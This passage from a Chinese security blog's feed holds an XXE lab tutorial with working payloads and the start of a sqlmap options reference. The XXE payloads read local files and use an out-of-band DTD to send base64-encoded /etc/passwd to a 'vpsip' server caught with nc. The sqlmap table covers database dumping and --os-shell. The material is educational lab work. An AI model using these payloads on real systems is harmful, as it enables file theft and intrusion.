class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/MKwYYjcHiiHNzT4RzRuBZg</span><br><span class="line">https://www.bilibili.com/video/BV1er4y1C7wU/?spm_id_from=333.337.search-card.all.click</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://mp.weixin.qq.com/s/2PF9lbIcqPHDBUmiFxX7yw</span><br><span class="line">https://mp.weixin.qq.com/s/f8Lcwz-yjZXCsXiA64gNMg</span><br><span class="line">https://www.52pojie.cn/thread-1593662-1-1.html</span><br><span class="line">https://mp.weixin.qq.com/s/iVsjdjkO5xfqQVHfNEyeUQ</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞系列-XXE(外部实体注入)</title>
      <link href="/2022/11/01/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-XXE/"/>
      <url>/2022/11/01/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-XXE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>XXE(XML External Entity Injection)，即 XML 外部实体注入。由于 XML 解析器程序配置不当，解析了攻击者伪造的外部实体而产生的攻击。注入的本质是用户输入的数据被当做代码进行执行。</p><h3 id="xml格式"><a href="#xml格式" class="headerlink" title="xml格式"></a>xml格式</h3><p>XML 代表可扩展的标记语言，旨在存储和传输数据，类似 HTML，有一个树状的标签和数据结构。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。</p><p>例子如下：</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span> //xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ //DTD声明</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test1</span> <span class="string">&quot;test1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test2</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;test1;&amp;test2;<span class="tag">&lt;/<span class="name">test</span>&gt;</span> //文档元素</span><br></pre></td></tr></table></figure></div><br/><h4 id="外部实体与内部实体"><a href="#外部实体与内部实体" class="headerlink" title="外部实体与内部实体"></a>外部实体与内部实体</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用，即内部实体和外部实体。内部实体从内部文件引用，外部实体从外部文件引用（使攻击者远程加载恶意命令或文件）。</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span> //xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ //DTD声明</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test1</span> <span class="string">&quot;test1&quot;</span>&gt;</span> //内部实体</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test2</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/1.dtd&quot;</span>&gt;</span> //外部实体</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;test1;&amp;test2;<span class="tag">&lt;/<span class="name">test</span>&gt;</span> //文档元素</span><br></pre></td></tr></table></figure></div><br/><h4 id="一般实体与参数实体"><a href="#一般实体与参数实体" class="headerlink" title="一般实体与参数实体"></a>一般实体与参数实体</h4><p>一般实体：</p><p>在 DTD 中定义实体，在 XML 文档中引用，一般实体的定义无 % 开头，引用以 &amp; 开头，以;结尾</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span>]&gt;</span> //外部实体</span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span> //<span class="symbol">&amp;xxe;</span>引用了外部实体</span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>pass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><br/><p>参数实体：</p><p>参数实体定义以 % 作为开头，引用也以 % 开头</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://eja5f2.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>&amp;1111<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="二、漏洞点及危害"><a href="#二、漏洞点及危害" class="headerlink" title="二、漏洞点及危害"></a>二、漏洞点及危害</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>所有使用 XML 格式的存在 XXE 漏洞的可能，插入测试语句观察其返回语句是否符合预期，如下图</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031165107742.png" data-caption="image-20221031165107742"><img src="/../images/xxe/image-20221031165107742.png" alt="image-20221031165107742"></a></p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本地文件读取</span><br><span class="line">内网访问</span><br><span class="line">主机扫描/端口扫描</span><br><span class="line">远程代码执行</span><br><span class="line">拒绝服务攻击</span><br></pre></td></tr></table></figure></div><h2 id="三、漏洞学习"><a href="#三、漏洞学习" class="headerlink" title="三、漏洞学习"></a>三、漏洞学习</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境地址：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> 这边选择 Phpstudy 直接启服务，过于简单，不再赘述，访问页面如下</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031170222098.png" data-caption="image-20221031170222098"><img src="/../images/xxe/image-20221031170222098.png" alt="image-20221031170222098"></a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用 Burp 抓包，利用上面知识点，构造完整 XML 格式，并构造引用<code>一般实体</code>进行漏洞测试</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031171102055.png" data-caption="image-20221031171102055"><img src="/../images/xxe/image-20221031171102055.png" alt="image-20221031171102055"></a></p><p>构造引用 <code>参数实体</code> 测试</p><p>VPS 开启服务，测试网络是否能远程进行访问，若能进行访问则证明存在漏洞，能进行远程加载</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031172421381.png" data-caption="image-20221031172421381"><img src="/../images/xxe/image-20221031172421381.png" alt="image-20221031172421381"></a></p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:2333&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031194203105.png" data-caption="image-20221031194203105"><img src="/../images/xxe/image-20221031194203105.png" alt="image-20221031194203105"></a></p><p>服务器接收到请求</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031193511744.png" data-caption="image-20221031193511744"><img src="/../images/xxe/image-20221031193511744.png" alt="image-20221031193511744"></a></p><p>通过 OOB(Out-Of-Band),远程加载 .dtd 文件实现攻击</p><p>1、vps上放置 dtd文件,名为 my.dtd , 文件内容为命令执行 <code>file:///windows/win.ini</code></p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure></div><p>2、利用 Python3 在 dtd 文件目录下起临时 WEB 服务</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031200337379.png" data-caption="image-20221031200337379"><img src="/../images/xxe/image-20221031200337379.png" alt="image-20221031200337379"></a></p><p>3、Burp 放包远程加载 .dtd 文件</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">my</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x:2333/my.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %my;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221031200130341.png" data-caption="image-20221031200130341"><img src="/../images/xxe/image-20221031200130341.png" alt="image-20221031200130341"></a></p><p>Blind OOB XXE（Out-Of-Band）当存在 xxe 漏洞，但无回显，这时候想要读取敏感文件的时候，就需要用到 file 协议进行数据外带</p><p>1、这边利用 Vulhub 中的环境进行复现，进入 vulhub 中的 php_xxe 路径下，在 www 目录下创建 xml.php 漏洞环境，源码如下</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101122158265.png" data-caption="image-20221101122158265"><img src="/../images/xxe/image-20221101122158265.png" alt="image-20221101122158265"></a></p><p>Docker 启动环境 <code>docker-compose up -d</code></p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101092838369.png" data-caption="image-20221101092838369"><img src="/../images/xxe/image-20221101092838369.png" alt="image-20221101092838369"></a></p><p>访问 8080 端口，成功搭建环境页面如下：</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101093122193.png" data-caption="image-20221101093122193"><img src="/../images/xxe/image-20221101093122193.png" alt="image-20221101093122193"></a></p><p>访问 dom.php 触发 xxe 漏洞，进行文件读取</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101100913475.png" data-caption="image-20221101100913475"><img src="/../images/xxe/image-20221101100913475.png" alt="image-20221101100913475"></a></p><p>同样地访问 xml.php 进行 文件读取，出现报错无法读取文件</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101101140907.png" data-caption="image-20221101101140907"><img src="/../images/xxe/image-20221101101140907.png" alt="image-20221101101140907"></a></p><p>3、远程加载 .dtd 文件，利用服务器回显内容，.dtd 文件内容如下，名为 my.dtd (注：dtd文件中的监听端口需与 nc 监听端口一致)</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vpsip:nc监听的端口?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>远程服务器中 my.dtd 目录下利用 Python 开启临时 WEB 服务 <code>python3 -m http.server 2333</code></p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101094028596.png" data-caption="image-20221101094028596"><img src="/../images/xxe/image-20221101094028596.png" alt="image-20221101094028596"></a></p><p>在相同服务器下，开启监听，接收回显数据 <code>nc -lvp 3333</code></p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101143501078.png" data-caption="image-20221101093949071"><img src="/../images/xxe/image-20221101143501078.png" alt="image-20221101093949071"></a></p><p>4、Burp 放包远程加载 dtd 文件，读取 dtd 文件内容进行命令执行</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vpsip:2333/my.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101110422030.png" data-caption="image-20221101110422030"><img src="/../images/xxe/image-20221101110422030.png" alt="image-20221101110422030"></a></p><p>VPS上成功接收执行命令后的数据，数据格式为 base64</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101110717899.png" data-caption="image-20221101110717899"><img src="/../images/xxe/image-20221101110717899.png" alt="image-20221101110717899"></a></p><p>?p&#x3D;执行后返回数据的 base64 格式，解码后得到数据</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101110833149.png" data-caption="image-20221101110833149"><img src="/../images/xxe/image-20221101110833149.png" alt="image-20221101110833149"></a></p><p>注意 libxml 2.9.0 版本后不支持解析外部实体，即无法进行远程加载 dtd。</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101093249009.png" data-caption="image-20221101093249009"><img src="/../images/xxe/image-20221101093249009.png" alt="image-20221101093249009"></a></p><p>综上所述，XXE 漏洞实际上都是通过 file 协议读取本地文件，相对应其他平台协议如下:</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">| libxml2 | PHP            | Java     | .NET  |</span><br><span class="line">| ------- | -------------- | -------- | ----- |</span><br><span class="line">| file    | file           | http     | file  |</span><br><span class="line">| http    | http           | https    | http  |</span><br><span class="line">| ftp     | ftp            | ftp      | https |</span><br><span class="line">|         | php            | file     | ftp   |</span><br><span class="line">|         | compress.zlib  | jar      |       |</span><br><span class="line">|         | compress.bzip2 | netdoc   |       |</span><br><span class="line">|         | data           | mailto   |       |</span><br><span class="line">|         | glob           | gopher * |       |</span><br><span class="line">|         | phar           |          |       |</span><br></pre></td></tr></table></figure></div><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>通过一系列了解，XXE 漏洞通过 file 协议进行本地文件读取，然后通过读取到的信息进行组合攻击，类似于 SSRF。主要攻击路径：本地文件读取、内网访问、主机扫描&#x2F;端口扫描、远程代码执行<br>、拒绝服务攻击。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://blog.zsec.uk/blind-xxe-learning/</span><br><span class="line">https://www.freebuf.com/articles/web/265324.html</span><br><span class="line">https://mp.weixin.qq.com/s/mm4hxXzaiaXUFcKk_wrtCw</span><br><span class="line">https://github.com/c0ny1/xxe-lab</span><br><span class="line">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap 进阶使用考究</title>
      <link href="/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/"/>
      <url>/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Sqlmap 这么优秀的自动化测试工具就不必过多介绍了，也是日常工作中使用频率比较高的一款工具，文章主要考究其基本用法及部分进阶使用手段。</p><h2 id="二、sqlmap常用参数"><a href="#二、sqlmap常用参数" class="headerlink" title="二、sqlmap常用参数"></a>二、sqlmap常用参数</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">| 命令参数                        | 参数作用                                                     |</span><br><span class="line">| ------------------------------ | ------------------------------------------------------------ |</span><br><span class="line">| -u                             | 指定目标url                                                  |</span><br><span class="line">| -r                             | 从文件中加载HTTP请求（数据包）                               |</span><br><span class="line">| *                              | json格式指定参数，如指定参数orderNo：&#123;&quot;phoneNo&quot;:&quot;15123456789&quot;,&quot;platNum&quot;:&quot;844519422627945&quot;,&quot;orderNo&quot;:&quot;1*&quot;&#125; |</span><br><span class="line">| -m                             | 从文本中获取多个目标扫描                                     |</span><br><span class="line">| --data                         | 以POST方式提交数据                                           |</span><br><span class="line">| -random-agent                  | 随机User-Agent                                               |</span><br><span class="line">| --user-agent                   | 指定User-Agent                                               |</span><br><span class="line">| --delay                        | 设置请求间的延迟                                             |</span><br><span class="line">| --timeout                      | 指定超时时间                                                 |</span><br><span class="line">| --dbms                         | 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等 |</span><br><span class="line">| --os                           | 指定数据库服务器操作系统                                     |</span><br><span class="line">| --tamper                       | 指定脚本tamper                                               |</span><br><span class="line">| --level                        | 指定探测等级                                                 |</span><br><span class="line">| --risk                         | 指定风险等级                                                 |</span><br><span class="line">| --technique                    | B: Boolean-based blind SQL injection&lt;br/&gt;E: Error-based SQL injection&lt;br/&gt;U: UNION query SQL injection&lt;br/&gt;S: Stacked queries SQL injection&lt;br/&gt;T: Time-based blind SQL injection |</span><br><span class="line">| -p                             | 指定需要测试的参数                                           |</span><br><span class="line">| –batch                         | 自动选择Y/N                                                  |</span><br><span class="line">| –dbs                           | 枚举数据库                                                   |</span><br><span class="line">| -D                             | DATABASE：指定数据库                                         |</span><br><span class="line">| –tables                        | 枚举表名                                                     |</span><br><span class="line">| -T                             | 指定表名                                                     |</span><br><span class="line">| –columns                       | 枚举列名                                                     |</span><br><span class="line">| -D                             | COLUMN：指定字段                                             |</span><br><span class="line">| –dump                          | 脱取指定字段                                                 |</span><br><span class="line">| –dump-all                      | 脱取数据库全部字段                                           |</span><br><span class="line">| -a/–all                        | 获取所有信息                                                 |</span><br><span class="line">| -b/–banner                     | 获取banner信息                                               |</span><br><span class="line">| –current-user                  | 获取当前数据库用户                                           |</span><br><span class="line">| –is-dba                        | 判断当前用户是否为DBA权限                                    |</span><br><span class="line">| –users                         | 枚举用户列表                                                 |</span><br><span class="line">| –sql-shell                     | 返回交互式数据库的shell                                      |</span><br><span class="line">| –os-shell                      | 返回交互式的操作系统shell                                    |</span><br><span class="line">| –os-cmd                        | 执行OS命令CMD                                                |</span><br><span class="line">| –cookie=COOKIE                 | 伪造cookie                                                   |</span><br><span class="line">| --proxy=PROXY                  | 使用代理连接目标 URL                                         |</span><br><span class="line">| --mobile                       | 使用 HTTP User-Agent 模仿智能手机                            |</span><br><span class="line">| -H HEADER                      | 设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;） |</span><br><span class="line">| --ignore-proxy                 | 忽略系统默认代理设置                                         |</span><br><span class="line">| *                              | 在                                                           |</span><br><span class="line">| --keep-alive                   | 保持连接，出现[CRITICAL] connection......报错的时候，使用这个参数 |</span><br><span class="line">| --referer http://www.baidu.com | #伪造referer字段                                             |</span><br><span class="line">| -v 3                           | 输出详细度,最大值5,会显示请求包和回复包                      |</span><br><span class="line">| --roles                        | 列出数据库所有管理员角色，仅适用于oracle数据库的时候         |</span><br><span class="line">| --identify-waf                 | 检测是否有WAF                                                |</span><br></pre></td></tr></table></figure></div><h2 id="三、基本使用"><a href="#三、基本使用" class="headerlink" title="三、基本使用"></a>三、基本使用</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 